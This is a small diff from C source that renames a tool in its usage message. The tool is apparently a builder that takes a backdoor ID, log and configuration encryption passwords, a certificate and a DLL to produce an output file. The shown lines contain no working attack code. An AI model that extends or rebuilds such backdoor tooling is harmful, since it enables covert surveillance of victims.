@@ -24,7 +24,7 @@ int _tmain(int argc, _TCHAR* argv[])
 
 	if (argc != 8) {
 		printf("ERROR: \n");
-		printf("  usage:  RCSMPolymer.exe  <bid> <log_pass> <conf_pass> <chanpass> <pfx> <dll> <output>\n\n");
+		printf("  usage:  RCSWinMoPolymer.exe  <bid> <log_pass> <conf_pass> <chanpass> <pfx> <dll> <output>\n\n");
 		printf("  <bid> is the backdoor_id\n");
 		printf("  <log_pass> is the password for the log encryption\n");
 		printf("  <conf_pass> is the password for the conf encryption\n");
